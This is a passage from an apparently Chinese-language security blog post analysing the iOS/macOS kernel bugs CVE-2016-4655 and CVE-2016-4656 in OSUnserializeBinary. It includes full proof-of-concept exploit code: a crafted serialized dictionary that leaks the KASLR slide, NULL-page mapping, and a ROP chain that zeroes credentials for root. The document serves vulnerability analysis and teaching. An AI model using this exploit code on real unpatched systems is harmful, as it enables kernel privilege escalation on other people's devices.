目录</h2><ol><li><code>OSUnserializeBinary</code>概述</li><li>漏洞分析-CVE-2016-4655，CVE-2016-4656</li><li>漏洞利用-PoC分析</li><li>总结</li></ol><h2 id="0x02-OSUnserializeBinary概述"><a href="#0x02-OSUnserializeBinary概述" class="headerlink" title="0x02 OSUnserializeBinary概述"></a>0x02 <code>OSUnserializeBinary</code>概述</h2><ol><li><p>序列化与反序列化<br>在软件开发的过程中，两个模块通信时就需要序列化与发序列化，常见的xml-&gt;JSON，对应的反序列化JOSN-&gt;xml。简单来说就是数据格式上的一种相互转化。<br>在XNU内核也有一个实现，<code>OSUnserializeXML</code>(将xml格式转化为内核数据对象)和<code>OSUnserializeBinary</code>(将二进制格式转化为内核数据对象)</p></li><li><p><code>OSUnserializeBinary</code>的二进制格式<br><code>OSUnserializeBinary</code>这个函数将连续的二进制流分成<code>uint32_t</code>32字节来处理。所以32位的整数就有特殊含义来表示一些数据结构。如下  </p></li></ol><pre><code class="C">#define kOSSerializeBinarySignature &quot;\323\0\0&quot; /* 0x000000d3 */enum {    kOSSerializeDictionary      = 0x01000000U,    kOSSerializeArray           = 0x02000000U,    kOSSerializeSet             = 0x03000000U,    kOSSerializeNumber          = 0x04000000U,    kOSSerializeSymbol          = 0x08000000U,    kOSSerializeString          = 0x09000000U,    kOSSerializeData            = 0x0a000000U,    kOSSerializeBoolean         = 0x0b000000U,    kOSSerializeObject          = 0x0c000000U,    kOSSerializeTypeMask        = 0x7F000000U,    kOSSerializeDataMask        = 0x00FFFFFFU,    kOSSerializeEndCollection   = 0x80000000U,};</code></pre><p>这里的<code>0x000000d3</code>代表了这个数据流的签名即开始的32位必须为该整数值，下面有一个字典，数组，集合等集合类数据结构，也有数字，字符串等基本数据结构表示。<code>kOSSerializeTypeMask</code>和<code>kOSSerializeDataMask</code>分别为类型和数据大小掩码。<code>kOSSerializeEndCollection</code>代表当前集合(dic，array或set)是否结束。<br>可以看到，31位表示当前集合是否结束，30-24位表示当前数据类型，23-0表示元素的长度。</p><table><thead><tr><th>当前集合是否结束</th><th>当前数据类型</th><th>当前元素长度</th></tr></thead><tbody><tr><td>0</td><td>0000000</td><td>000000000000000000000000</td></tr></tbody></table><p>例如下面的二进制数据</p><pre><code class="C">0x000000d3 0x81000000 0x09000004 0x41414141 0x8b000001</code></pre><p>则对应：</p><pre><code class="C">&lt;dict&gt;    &lt;string&gt;AAAA&lt;/string&gt;  //键key    &lt;boolean&gt;1&lt;/boolean&gt;  //值value&lt;/dict&gt;</code></pre><p>这样的数据结构。对应过程也很简单，<code>0x000000d3</code>标志为合法的签名，<code>0x81000000</code>为dic类型且为最后一个元素，<code>0x09000004</code>为4字节大小的字符串，<code>0x8b000001</code>为bool型，所以只需用最后一位代表true或false</p><ol><li><code>OSUnserializeBinary()</code>分析<br>完整源代码见文末，下面将对其中几个重要的地方分别做分析说明  </li></ol><pre><code>    while (ok)    {        bufferPos += sizeof(*next);        if (!(ok = (bufferPos &lt;= bufferSize))) break;        key = *next++;        len = (key &amp; kOSSerializeDataMask);        wordLen = (len + 3) &gt;&gt; 2;        end = (0 != (kOSSerializeEndCollecton &amp; key));        newCollect = isRef = false;        o = 0; newDict = 0; newArray = 0; newSet = 0;        switch (kOSSerializeTypeMask &amp; key)        {            case kOSSerializeDictionary:            ...            case kOSSerializeArray:            ...            case kOSSerializeSet:            ...            case kOSSerializeObject:            ...            case kOSSerializeNumber:            ...            case kOSSerializeSymbol:            ...            case kOSSerializeString:            ...            case kOSSerializeData:            ...            case kOSSerializeBoolean:            ...            default:                break;        }        ...</code></pre><p>进行一些初始化和检查后就进入<code>while(ok)</code>循环，并且是以32位的整数位单位遍历循环，读取当前的整数<code>key</code>，确定其长度<code>len</code>，当前集合31位是否设置<code>end</code>。并通过类型掩码<code>kOSSerializeTypeMask</code>确定其<code>key</code>的类型从而进入不同的case。例如我们看<code>kOSSerializeDictionary</code>例子  </p><pre><code>case kOSSerializeDictionary:    o = newDict = OSDictionary::withCapacity(len);    newCollect = (len != 0);    break;</code></pre><p>o为指向当前反序列化对象的指针，在每种case中被指定  </p><pre><code>case kOSSerializeData:    bufferPos += (wordLen * sizeof(uint32_t));    if (bufferPos &gt; bufferSize) break;    o = OSData::withBytes(next, len);    next += wordLen;    break;</code></pre><p>这里当遇到一个为<code>kOSSerializeData</code>类型时，根据其<code>len</code>找到其数据并将其存储在<code>OSData</code>数据结构中，并移动<code>next</code>。其他的case都做类似对应的处理。<br>跳出switch  </p><pre><code>if (!(ok = (o != 0))) break;</code></pre><p>因为每一次循环都会进入<code>case</code>并将o设置为对应对象才合法，当等于0时就说明不合法，则退出。  </p><pre><code>if (!isRef){    setAtIndex(objs, objsIdx, o);    if (!ok) break;    objsIdx++;}</code></pre><p>这里很重要将与后面的漏洞相关，首先判断<code>isRef</code>是否被设置。</p><pre><code> case kOSSerializeObject:                if (len &gt;= objsIdx) break;                o = objsArray[len];                o-&gt;retain();                isRef = true;                break;</code></pre><p><code>isRef</code>只有当当前的类型为<code>kOSSerializeObject</code>即引用类型是才被设为<code>true</code>，这里引用的意思则表示当前指向<code>dic</code>中其他数据，其值为对应下标。<br>回到前面那里，下面重点关注<code>setAtIndex</code>这个宏定义</p><pre><code class="js">#define setAtIndex(v, idx, o)                                                           \    if (idx &gt;= v##Capacity)                                                            \    {                                                                                   \        uint32_t ncap = v##Capacity + 64;                                               \        typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));  \        if (!nbuf) ok = false;                                                          \        if (v##Array)                                                                   \        {                                                                               \            bcopy(v##Array, nbuf, v##Capacity * sizeof(o));                             \            kfree(v##Array, v##Capacity * sizeof(o));                                   \        }                                                                               \        v##Array    = nbuf;                                                             \        v##Capacity = ncap;                                                             \    }                                                                                   \    if (ok) v##Array[idx] = o;</code></pre><p>看着很复杂，但简单来说就是如果数组大小不够的话就增加大小，然后就将其之前的o指向的对象放到<code>objs</code>数组中对应的位置。</p><pre><code class="C">if (dict){        if (sym)        {            if (o != dict) ok = dict-&gt;setObject(sym, o, true);            o-&gt;release();            sym-&gt;release();            sym = 0;        }        else        {            sym = OSDynamicCast(OSSymbol, o);            if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))            {                sym = (OSSymbol *) OSSymbol::withString(str);                o-&gt;release();                o = 0;            }            ok = (sym != 0);        }    }    else if (array)    {        ok = array-&gt;setObject(o);        o-&gt;release();    }    else if (set)    {        ok = set-&gt;setObject(o);       o-&gt;release();   }    else    {        assert(!parent);        result = o;    }</code></pre><p>对解析出来的当前的集合做对应处理，比如这里的如果<code>dic</code>为真，因为<code>dic</code>字典数据结构需要<code>key-&gt;value</code>键值对的形式，所以先判断<code>sym</code>，若没设置，则代表当前<code>o</code>对象为key，则将其转化为<code>OSSymbol</code>类型，设置<code>sym</code>为true并将<code>o</code>free，那么下一次的<code>o</code>代表的对象一定是值，然后就将<code>sym</code>和<code>o</code>以键值对的形式存储在<code>dic</code>字典中，如此交替。<br>后面的代码对漏洞来说不是很重要了  </p><pre><code>if (newCollect){        if (!end)            {                stackIdx++;                setAtIndex(stack, stackIdx, parent);                if (!ok) break;            }            DEBG(&quot;++stack[%d] %p\n&quot;, stackIdx, parent);            parent = o;            dict   = newDict;            array  = newArray;            set    = newSet;            end    = false;        }        if (end)        {            if (!stackIdx) break;            parent = stackArray[stackIdx];            DEBG(&quot;--stack[%d] %p\n&quot;, stackIdx, parent);            stackIdx--;            set   = 0;             dict  = 0;             array = 0;            if (!(dict = OSDynamicCast(OSDictionary, parent)))            {                if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));            }        }</code></pre><p>简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当<code>end</code>时就将整个新集合放入之前的<code>dic</code>。</p><h2 id="0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656"><a href="#0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656" class="headerlink" title="0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656"></a>0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656</h2><p>这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞</p><h3 id="CVE-2016-4655-infoleak"><a href="#CVE-2016-4655-infoleak" class="headerlink" title="CVE-2016-4655-infoleak"></a>CVE-2016-4655-infoleak</h3><p>和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。</p><p>下面看漏洞点，回顾之前<code>kOSSerializeNumber</code>这个case内容</p><pre><code>case kOSSerializeNumber:    bufferPos += sizeof(long long);    if (bufferPos &gt; bufferSize) break;    value = next[1];    value &lt;&lt;= 32;    value |= next[0];    o = OSNumber::withNumber(value, len);    next += 2;    break;</code></pre><p>这里存在什么问题呢？这里没有检查<code>OSNumber</code>的长度，也就是说我们可以创建一个任意长度的<code>OSNumber</code>，进而在内核读取的时候越界，然后泄漏内核地址信息。</p><h3 id="CVE-2016-4656-UAF漏洞"><a href="#CVE-2016-4656-UAF漏洞" class="headerlink" title="CVE-2016-4656-UAF漏洞"></a>CVE-2016-4656-UAF漏洞</h3><p>UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。<br>来看下漏洞点，下面的代码是序列化字典dic将<code>OSString</code>这个键转化为<code>OSSymbol</code>，见下</p><pre><code class="C">if (dict){        if (sym)        {            ...        }        else        {            sym = OSDynamicCast(OSSymbol, o);            if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))            {                sym = (OSSymbol *) OSSymbol::withString(str);                o-&gt;release();                o = 0;            }            ok = (sym != 0);        }    }</code></pre><p>这里<code>o-&gt;release()</code>有什么问题呢?还记得<code>objsArray</code>吧，用来存储所有的对象，但是用<code>setAtIndex</code>这个宏来将所有的对象<code>o</code>存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面<code>kOSSerializeObject</code>中的<code>switchcase</code>。 </p><pre><code>case kOSSerializeObject:    if (len &gt;= objsIdx) break;    o = objsArray[len];    o-&gt;retain();    isRef = true;    break;</code></pre><p>此时之前存储在之前的<code>objsArray</code>的<code>OSString</code>已经free，而 <code>o = objsArray[len]; o-&gt;retain();</code>由对其进行了<code>retain</code>引用，好的一个完美的UAF漏洞。<br>所以我们可以构造一个字典<code>dic</code>，其中<code>OSString</code>包含一些配对的值，然后序列化一个<code>kOSSerializeObject</code>引用对象，<code>OSString</code>将调用<code>retain</code>，但却是一个被释放的对象。  </p><h2 id="0x04-漏洞利用-PoC分析"><a href="#0x04-漏洞利用-PoC分析" class="headerlink" title="0x04 漏洞利用-PoC分析"></a>0x04 漏洞利用-PoC分析</h2><p>同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用</p><h3 id="CVE-2016-4655-infoleak漏洞利用"><a href="#CVE-2016-4655-infoleak漏洞利用" class="headerlink" title="CVE-2016-4655-infoleak漏洞利用"></a>CVE-2016-4655-infoleak漏洞利用</h3><p>infoleak漏洞利用步骤：</p><ul><li>构造一个包含过长的<code>OSNumber</code>dic字典</li><li>用这个序列化字典去设置userclient对象的属性</li><li>读回设置的<code>OSNumber</code>属性，造成infoleak</li><li>利用读取回来的内核地址信息计算KASLR    </li></ul><p>完整的代码。</p><pre><code>uint64_t kslide_infoleak(void){    kern_return_t kr = 0, err = 0;    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;    io_service_t serv = 0;    io_connect_t conn = 0;    io_iterator_t iter = 0;    uint64_t kslide = 0;    void *dict = calloc(1, 512);    uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries    WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte    WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key + NUL byte in little-endian    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number    WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe    host_get_io_master(mach_host_self(), &amp;master); // get iokit master port    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);    if (kr == KERN_SUCCESS) {        printf(&quot;(+) Dictionary is valid! Spawning user client...\n&quot;);    } else        return -1;    serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;));    kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);    if (kr == KERN_SUCCESS) {        printf(&quot;(+) UC successfully spawned! Leaking bytes...\n&quot;);    } else        return -1;    IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter);    io_object_t object = IOIteratorNext(iter);    char buf[0x200] = {0};    mach_msg_type_number_t bufCnt = 0x200;    kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt);    if (kr == KERN_SUCCESS) {        printf(&quot;(+) Done! Calculating KASLR slide...\n&quot;);    } else        return -1;#if 0    for (uint32_t k = 0; k &lt; 128; k += 8) {        printf(&quot;%#llx\n&quot;, *(uint64_t *)(buf + k));    }#endif    uint64_t hardcoded_ret_addr = 0xffffff80003934bf;    kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;    printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);    return kslide;}</code></pre><h4 id="构造字典"><a href="#构造字典" class="headerlink" title="构造字典"></a>构造字典</h4><p>看下面这段代码</p><pre><code>void *dict = calloc(1, 512);uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)</code></pre><p>这里的<code>WRITE_IN</code>这个宏只是为了方便我们将数据填入内存之中  </p><p>xml的字典格式  </p><pre><code>&lt;dict&gt;    &lt;symbol&gt;AAA&lt;/symbol&gt;    &lt;number size=0x200&gt;0x4141414141414141&lt;/number&gt;&lt;/dict&gt;</code></pre><p>对应的代码  </p><pre><code>WRITE_IN(dict, (0x000000d3)); // 头部签名WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // 包含两个元素的字典WRITE_IN(dict, (kOSSerializeSymbol | 4)); // 长度为3的symbolWRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key键WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); //0x200大小的numberWRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); //实际8字节的number</code></pre><p>利用<code>io_service_get_matching_services_bin</code>测试我们的<code>dic</code>是否有效  </p><pre><code>host_get_io_master(mach_host_self(), &amp;master); // get iokit master portkr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);if (kr == KERN_SUCCESS) {    printf(&quot;(+) Dictionary is valid! Spawning user client...\n&quot;);} else    return -1;</code></pre><p>若<code>kr == KERN_SUCCESS</code>则我们的<code>dic</code>则为有效</p><h4 id="生成UserClient设定属性"><a href="#生成UserClient设定属性" class="headerlink" title="生成UserClient设定属性"></a>生成UserClient设定属性</h4><p>我们需要一个<code>UserClient</code>用来和内核通信，所以使用<code>io_service_open_extended</code>来产生一个相关服务的<code>UserClient</code>，这里的服务并不重要  </p><pre><code>serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;));kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);if (kr == KERN_SUCCESS) {    printf(&quot;(+) UC successfully spawned! Leaking bytes...\n&quot;);} else    return -1;</code></pre><p>首先我们通过<code>IOServiceGetMatchingService</code>去从<code>IORegistry</code>里匹配一个特定服务，然后通过<code>io_service_open_extended</code>让可以设置其属性并打开一个服务即隐式产生<code>UserClient</code><br>接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代<code>IORegistry</code>找到刚刚创建的<code>UserClient</code>。  </p><pre><code>IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter);io_object_t object = IOIteratorNext(iter);</code></pre><p>先通过<code>serv</code>端口创建<code>io_iterator_t</code>，我们的<code>UserClient</code>在<code>serv</code>创建之后，所以拿到<code>iter</code>后迭代一次即为我们的<code>UserClient</code>，现在就可以读取其属性并触发info-leak。</p><h4 id="读取属性，触发info-leak"><a href="#读取属性，触发info-leak" class="headerlink" title="读取属性，触发info-leak"></a>读取属性，触发info-leak</h4><pre><code>char buf[0x200] = {0};mach_msg_type_number_t bufCnt = 0x200;kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt);if (kr == KERN_SUCCESS) {    printf(&quot;(+) Done! Calculating KASLR slide...\n&quot;);} else    return -1;</code></pre><p>通过<code>io_registry_entry_get_property_bytes</code>我们可以获取到原始字节，存在<code>buf</code>中，我们打印其值  </p><pre><code>for (uint32_t k = 0; k &lt; 128; k += 8) {    printf(&quot;%#llx\n&quot;, *(uint64_t *)(buf + k));}</code></pre><p>对应输出：  </p><pre><code>0x4141414141414141  // 有效的number0xffffff8033c66284  //0xffffff8035b5d800  //0x4                 // 其他数据或返回地址0xffffff803506d5a0  //0xffffff8033c662b4  //0xffffff818d2b3e30  //0xffffff80037934bf  // 函数返回地址...</code></pre><p>我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数<br>这里实际读取的代码位于<code>is_io_registry_entry_get_property_bytes</code>函数，即<code>io_registry_entry_get_property_bytes</code>调用了 <code>is_io_registry_entry_get_property_bytes</code>。</p><p><code>is_io_registry_entry_get_property_bytes</code>源代码</p><pre><code>/* Routine io_registry_entry_get_property */kern_return_t is_io_registry_entry_get_property_bytes(    io_object_t registry_entry,    io_name_t property_name,    io_struct_inband_t buf,    mach_msg_type_number_t *dataCnt ){    OSObject    *    obj;    OSData     *    data;    OSString     *    str;    OSBoolean    *    boo;    OSNumber     *    off;    UInt64        offsetBytes;    unsigned int    len = 0;    const void *    bytes = 0;    IOReturn        ret = kIOReturnSuccess;    CHECK( IORegistryEntry, registry_entry, entry );#if CONFIG_MACF    if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name))        return kIOReturnNotPermitted;#endif    obj = entry-&gt;copyProperty(property_name);    if( !obj)        return( kIOReturnNoResources );    // One day OSData will be a common container base class    // until then...    if( (data = OSDynamicCast( OSData, obj ))) {    len = data-&gt;getLength();    bytes = data-&gt;getBytesNoCopy();    } else if( (str = OSDynamicCast( OSString, obj ))) {    len = str-&gt;getLength() + 1;    bytes = str-&gt;getCStringNoCopy();    } else if( (boo = OSDynamicCast( OSBoolean, obj ))) {    len = boo-&gt;isTrue() ? sizeof(&quot;Yes&quot;) : sizeof(&quot;No&quot;);    bytes = boo-&gt;isTrue() ? &quot;Yes&quot; : &quot;No&quot;;    } else if( (off = OSDynamicCast( OSNumber, obj ))) {    /* j: reading an OSNumber */    offsetBytes = off-&gt;unsigned64BitValue();    len = off-&gt;numberOfBytes();    bytes = &amp;offsetBytes;#ifdef __BIG_ENDIAN__    bytes = (const void *)        (((UInt32) bytes) + (sizeof( UInt64) - len));#endif    } else    ret = kIOReturnBadArgument;    if( bytes) {    if( *dataCnt &lt; len)        ret = kIOReturnIPCError;    else {            *dataCnt = len;            bcopy( bytes, buf, len );    }    }    obj-&gt;release();    return( ret );}</code></pre><p>下面代码表示正在读取<code>OSNumber</code>，</p><pre><code>...else if( (off = OSDynamicCast( OSNumber, obj ))) {    offsetBytes = off-&gt;unsigned64BitValue(); /* j: the offsetBytes variable is allocated on the stack */    len = off-&gt;numberOfBytes(); /* j: this reads out our malformed length, 0x200 */    bytes = &amp;offsetBytes; /* j: bytes* ptr points to a stack variable */    ...}...</code></pre><p>然后</p><pre><code>if( bytes) {    if( *dataCnt &lt; len)        ret = kIOReturnIPCError;    else {        *dataCnt = len;        bcopy( bytes, buf, len ); /* j: this leaks data from the stack */    }}</code></pre><p>执行<code>bcopy</code>时，从<code>bytes</code>里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值</p><h4 id="计算内核偏移"><a href="#计算内核偏移" class="headerlink" title="计算内核偏移"></a>计算内核偏移</h4><p>将<code>/System/Library/Kernels/kernel</code>拖入hopper，搜索<code>is_io_registry_entry_get_property_bytes</code>，如下图  </p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-0.png?raw=true" alt="0-0"></p><p>然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值</p><pre><code>0xffffff80037934bf - 0xffffff80003934bf = 0x3400000</code></pre><p>也就是下面这段代码所示：  </p><pre><code>uint64_t hardcoded_ret_addr = 0xffffff80003934bf;kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);</code></pre><p>现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！</p><h3 id="CVE-2016-4656-UAF漏洞利用"><a href="#CVE-2016-4656-UAF漏洞利用" class="headerlink" title="CVE-2016-4656-UAF漏洞利用"></a>CVE-2016-4656-UAF漏洞利用</h3><p>XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步<a href="https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/" target="_blank" rel="external">深入理解Linux堆分配器-DLMalloc</a>这篇分析。<br>那么下面要做的就是如何构造下一个分配的对象，这里我们用<code>OSData</code>因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次<code>o-&gt;retain</code>引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步<a href="https://null-me.github.io/2017/03/07/C++%20Virtual%20table/%E8%AF%A6%E8%A7%A3virtual%20table/" target="_blank" rel="external">详解virtual table</a>简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。<br>下面看我们的步骤：  </p><ul><li>制作一个二进制字典，释放<code>OSString</code>并重新分配<code>OSData</code>。</li><li>Map NULL</li><li>放置stack pivot在偏移0x20到NULL页面</li><li>将一个小的传输链0x0放置在NULL页面中（这将传递执行到主链）</li><li>触发漏洞</li><li>提升权限，生成shell</li></ul><p>下面看完整的Poc代码：  </p><pre><code>void use_after_free(void){    kern_return_t kr = 0;    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;    /* craft the dictionary */    printf(&quot;(i) Crafting dictionary...\n&quot;);    void *dict = calloc(1, 512);    uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries    WRITE_IN(dict, (kOSSerializeString | 4));   // string &#39;AAA&#39;, will get freed    WRITE_IN(dict, (0x00414141));    WRITE_IN(dict, (kOSSerializeBoolean | 1));  // bool, true    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol &#39;BBB&#39;    WRITE_IN(dict, (0x00424242));    WRITE_IN(dict, (kOSSerializeData | 32));    // data (0x00 * 32)    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol &#39;CCC&#39;    WRITE_IN(dict, (0x00434343));    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1));   // ref to object 1 (OSString)    /* map the NULL page */    mach_vm_address_t null_map = 0;    vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);    kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);    if (kr != KERN_SUCCESS)        return;    macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK);    printf(&quot;(i) Leaking kslide...\n&quot;);    SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide    /* set the stack pivot at 0x20 */    *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot    /* build ROP chain */    printf(&quot;(i) Building ROP chain...\n&quot;);    rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;));    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;));    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;));    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);    PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;));    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;));    /* chain transfer, will redirect execution flow from 0x0 to our main chain above */    uint64_t *transfer = (uint64_t *)0x0;    transfer[0] = ROP_POP_RSP(map);    transfer[1] = (uint64_t)chain-&gt;chain;    /* trigger */    printf(&quot;(+) All done! Triggering the bug!\n&quot;);    host_get_io_master(mach_host_self(), &amp;master); // get iokit master port    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);    if (kr != KERN_SUCCESS)        return;}</code></pre><p>这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到<br>下面一步一步分析</p><h4 id="构造字典-1"><a href="#构造字典-1" class="headerlink" title="构造字典"></a>构造字典</h4><p>将如下构造  </p><pre><code>&lt;dict&gt;    &lt;string&gt;AAA&lt;/string&gt;    &lt;boolean&gt;true&lt;/boolean&gt;    &lt;symbol&gt;BBB&lt;/symbol&gt;    &lt;data&gt;        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    &lt;/data&gt;    &lt;symbol&gt;CCC&lt;/symbol&gt;    &lt;reference&gt;1&lt;/reference&gt; &lt;!--引用第一个string元素--&gt;&lt;/dict&gt;</code></pre><p>当执行<code>retain</code>时就会以0x20的偏移量地址读取，也就是rip其值将为0x20<br>可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术</p><h4 id="Map-NULL"><a href="#Map-NULL" class="headerlink" title="Map NULL"></a>Map NULL</h4><p>苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-1.png?raw=true" alt="0-1"><br>意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。  </p><pre><code>mach_vm_address_t null_map = 0;vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);if (kr != KERN_SUCCESS)    return;</code></pre><p>这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志  </p><h3 id="Pivoting-stack和ROP链"><a href="#Pivoting-stack和ROP链" class="headerlink" title="Pivoting stack和ROP链"></a>Pivoting stack和ROP链</h3><p>下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步<a href="https://null-me.github.io/2017/04/13/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/" target="_blank" 